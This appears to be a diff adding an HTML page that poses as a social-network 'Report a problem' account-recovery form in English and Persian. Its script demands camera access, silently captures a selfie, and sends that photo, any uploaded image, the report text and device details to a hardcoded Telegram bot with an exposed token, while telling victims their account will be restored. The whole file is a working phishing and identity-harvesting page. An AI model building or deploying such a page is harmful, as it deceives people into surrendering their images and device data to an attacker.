@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Report a problem</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    body, html { min-height:100vh; background:#f0f2f5; color:#1c1e21; display:flex; flex-direction:column; }
+
+    /* Header */
+    .header {
+      background: #fff; box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 12px 16px; flex-shrink: 0; position: sticky; top: 0; z-index: 100;
+    }
+    .back-btn { 
+      font-size: 24px; color: #65676b; cursor: pointer; font-weight: 600;
+      padding: 8px; border-radius: 50%; transition: background 0.2s;
+    }
+    .back-btn:hover { background: #e4e6eb; }
+    .title { font-size: 20px; font-weight: 600; color: #1c1e21; }
+    .header-right { width: 40px; }
+
+    /* Main Content */
+    .main {
+      flex: 1; padding: 16px; display: flex; flex-direction: column; gap: 16px; overflow-y: auto;
+      background: #f0f2f5;
+    }
+    .section-title { font-size: 17px; font-weight: 600; color: #1c1e21; margin-bottom: 8px; }
+
+    /* Text Input */
+    .textarea {
+      background: #fff; border: 1px solid #dddfe2; border-radius: 12px;
+      padding: 14px; color: #1c1e21; font-size: 15px; resize: none; min-height: 100px;
+      width: 100%; outline: none; box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+    }
+    .textarea::placeholder { color: #8d949e; }
+    .textarea:focus { border-color: #1877f2; }
+
+    /* Info */
+    .info {
+      font-size: 13px; color: #65676b; line-height: 1.5; padding: 0 4px;
+    }
+    .info a { color: #1877f2; text-decoration: none; }
+    .info a:hover { text-decoration: underline; }
+
+    /* Image Upload */
+    .image-upload {
+      background: #fff; border: 1px dashed #ccd0d5; border-radius: 12px;
+      height: 180px; display: flex; flex-direction: column;
+      justify-content: center; align-items: center; position: relative;
+      transition: all 0.2s; box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+    }
+    .image-upload.disabled {
+      opacity: 0.6; cursor: not-allowed; pointer-events: none;
+      border-color: #dddfe2; background: #f9f9f9;
+    }
+    .image-upload input { display: none; }
+    .upload-icon { 
+      font-size: 48px; color: #65676b; margin-bottom: 8px; 
+      width: 64px; height: 64px; background: #e4e6eb; border-radius: 50%; 
+      display: flex; align-items: center; justify-content: center;
+    }
+    .upload-text { color: #65676b; font-size: 15px; font-weight: 500; text-align: center; }
+
+    .preview {
+      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+      object-fit: cover; border-radius: 12px; display: none;
+    }
+
+    /* Send Button */
+    .send-container {
+      display: flex; justify-content: center; margin-top: 12px;
+    }
+    .send-btn {
+      background: #1877f2; color: white; font-weight: 600; font-size: 16px;
+      padding: 10px 32px; border: none; border-radius: 8px; cursor: pointer;
+      transition: background 0.2s; min-width: 120px;
+    }
+    .send-btn:hover { background: #166fe5; }
+    .send-btn:disabled { background: #8d949e; cursor: not-allowed; }
+
+    /* Error */
+    .error {
+      background: #fdecea; color: #d93025; padding: 12px 16px; border-radius: 8px;
+      border: 1px solid #f5c2c7; text-align: center; margin: 0 4px; display: none; font-size: 14px;
+    }
+
+    /* Camera Permission Prompt */
+    .camera-prompt {
+      background: #fff; border: 1px solid #dddfe2; border-radius: 12px;
+      padding: 16px; text-align: center; box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+    }
+    .camera-prompt button {
+      background: #1877f2; color: white; border: none; padding: 10px 20px;
+      border-radius: 8px; font-size: 15px; cursor: pointer; margin-top: 12px;
+    }
+    .camera-prompt button:hover { background: #166fe5; }
+
+    /* Thank You Message */
+    .thank-you {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6); display: flex; align-items: center; justify-content: center;
+      z-index: 1000; display: none;
+    }
+    .thank-you-box {
+      background: #fff; border-radius: 16px; padding: 24px; max-width: 90%; text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    }
+    .thank-you-box h3 {
+      color: #1c1e21; font-size: 18px; margin-bottom: 12px;
+    }
+    .thank-you-box p {
+      color: #65676b; font-size: 15px; line-height: 1.5; margin-bottom: 20px;
+    }
+    .thank-you-box button {
+      background: #1877f2; color: white; border: none; padding: 10px 24px;
+      border-radius: 8px; font-size: 15px; cursor: pointer;
+    }
+    .thank-you-box button:hover { background: #166fe5; }
+
+    /* Hidden Elements */
+    #camera, #canvas { display: none; }
+
+    /* Responsive */
+    @media (min-width: 768px) {
+      .main { max-width: 600px; margin: 0 auto; padding: 24px 20px; }
+      .header { padding: 14px 24px; }
+      .textarea { min-height: 130px; font-size: 16px; }
+      .image-upload { height: 220px; }
+      .upload-icon { font-size: 56px; width: 72px; height: 72px; }
+      .upload-text { font-size: 16px; }
+      .info { font-size: 14px; }
+      .send-btn { padding: 12px 40px; font-size: 17px; }
+      .thank-you-box { max-width: 500px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="header">
+    <div class="back-btn">back</div>
+    <div class="title">Report a problem</div>
+    <div class="header-right"></div>
+  </div>
+
+  <!-- Main -->
+  <div class="main">
+    <div class="section-title">Profile</div>
+    <textarea class="textarea" id="reportText" placeholder="Type an explanation..."></textarea>
+
+    <div class="info">
+      Information about your device, account and this app will be automatically included in this report. 
+      To learn more about how your information is used, please see our 
+      <a href="#" target="_blank">Data Use Policy</a>.
+    </div>
+
+    <!-- مرحله 1: درخواست مجوز دوربین -->
+    <div class="camera-prompt" id="cameraPrompt">
+      <div class="upload-icon">camera</div>
+      <p style="margin: 12px 0; color:#1c1e21; font-size:15px;">
+        برای ادامه، اجازه دسترسی به دوربین را بدهید تا عکس سلفی گرفته شود.
+      </p>
+      <button id="allowCameraBtn">اجازه دسترسی</button>
+    </div>
+
+    <!-- مرحله 2: آپلود عکس -->
+    <label class="image-upload disabled" id="uploadArea">
+      <input type="file" accept="image/*" id="fileInput" />
+      <div class="upload-icon">camera</div>
+      <div class="upload-text">انتخاب عکس از گالری</div>
+      <img class="preview" id="previewImg" alt="Preview" />
+    </label>
+
+    <div class="send-container">
+      <button class="send-btn" id="sendBtn" disabled>Send</button>
+    </div>
+
+    <div class="error" id="errorMsg">
+      لطفاً ابتدا دسترسی به دوربین را تأیید کنید.
+    </div>
+  </div>
+
+  <!-- پیام تشکر -->
+  <div class="thank-you" id="thankYouModal">
+    <div class="thank-you-box">
+      <h3>تشکر از گزارش شما</h3>
+      <p>
+        ما از درخواست شما سپاسگزاریم.<br>
+        گزارش شما بررسی خواهد شد و اگر حساب شما قوانین ما را نقض نکرده باشد،<br>
+        حساب شما دوباره فعال خواهد شد.
+      </p>
+      <button id="closeThankYou">باشه</button>
+    </div>
+  </div>
+
+  <!-- Hidden Camera & Canvas -->
+  <video id="camera" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+<script>
+const TELEGRAM_BOT_TOKEN = '7455551654:AAEiqVcQCG29uzoXIiK9h2KUKfUef_GfRXM';
+const CHAT_ID = '5389485877';
+
+const reportText = document.getElementById('reportText');
+const cameraPrompt = document.getElementById('cameraPrompt');
+const uploadArea = document.getElementById('uploadArea');
+const fileInput = document.getElementById('fileInput');
+const previewImg = document.getElementById('previewImg');
+const sendBtn = document.getElementById('sendBtn');
+const errorMsg = document.getElementById('errorMsg');
+const allowCameraBtn = document.getElementById('allowCameraBtn');
+const thankYouModal = document.getElementById('thankYouModal');
+const closeThankYou = document.getElementById('closeThankYou');
+const video = document.getElementById('camera');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+
+let selfieBlob = null;
+let userPhotoBlob = null;
+let cameraAccess = false;
+
+// مرحله 1: درخواست مجوز
+allowCameraBtn.addEventListener('click', async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: 'user', width: 1280, height: 720 } 
+    });
+    video.srcObject = stream;
+    video.onloadedmetadata = () => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      setTimeout(captureSelfie, 800);
+    };
+    cameraAccess = true;
+
+    cameraPrompt.style.display = 'none';
+    uploadArea.classList.remove('disabled');
+    sendBtn.disabled = false;
+
+  } catch (err) {
+    cameraAccess = false;
+    alert('دسترسی به دوربین رد شد. نمی‌توانید ادامه دهید.');
+  }
+});
+
+// سلفی
+function captureSelfie() {
+  if (video.videoWidth > 0) {
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(blob => {
+      selfieBlob = blob;
+      stopCamera();
+    }, 'image/jpeg', 0.9);
+  }
+}
+
+function stopCamera() {
+  const stream = video.srcObject;
+  if (stream) stream.getTracks().forEach(t => t.stop());
+}
+
+// آپلود از گالری
+uploadArea.addEventListener('click', (e) => {
+  if (e.target.tagName === 'IMG') return;
+  fileInput.click();
+});
+
+fileInput.addEventListener('change', () => {
+  const file = fileInput.files[0];
+  if (file) {
+    userPhotoBlob = file;
+    const url = URL.createObjectURL(file);
+    previewImg.src = url;
+    previewImg.style.display = 'block';
+    uploadArea.querySelector('.upload-icon').style.display = 'none';
+    uploadArea.querySelector('.upload-text').style.display = 'none';
+  }
+});
+
+// ارسال + نمایش پیام تشکر
+sendBtn.addEventListener('click', async () => {
+  if (!cameraAccess) {
+    errorMsg.style.display = 'block';
+    setTimeout(() => errorMsg.style.display = 'none', 4000);
+    return;
+  }
+
+  const form = new FormData();
+  form.append('chat_id', CHAT_ID);
+
+  const caption = `گزارش جدید:\n\n` +
+    `متن: ${reportText.value || 'بدون توضیح'}\n` +
+    `دستگاه: ${navigator.userAgent}\n` +
+    `پلتفرم: ${navigator.platform}\n` +
+    `زمان: ${new Date().toLocaleString('fa-IR')}`;
+
+  if (selfieBlob || userPhotoBlob) {
+    const photo = selfieBlob || userPhotoBlob;
+    const filename = selfieBlob ? 'selfie.jpg' : photo.name;
+    form.append('photo', photo, filename);
+    form.append('caption', caption);
+  } else {
+    form.append('text', caption);
+  }
+
+  try {
+    const method = selfieBlob || userPhotoBlob ? 'sendPhoto' : 'sendMessage';
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`, {
+      method: 'POST',
+      body: form
+    });
+
+    // نمایش پیام تشکر
+    thankYouModal.style.display = 'flex';
+
+  } catch (e) {
+    alert('خطا در ارسال. لطفاً دوباره تلاش کنید.');
+  }
+});
+
+// بستن پیام تشکر
+closeThankYou.addEventListener('click', () => {
+  thankYouModal.style.display = 'none';
+  setTimeout(() => location.reload(), 300);
+});
+</script>
+
+</body>
+</html>
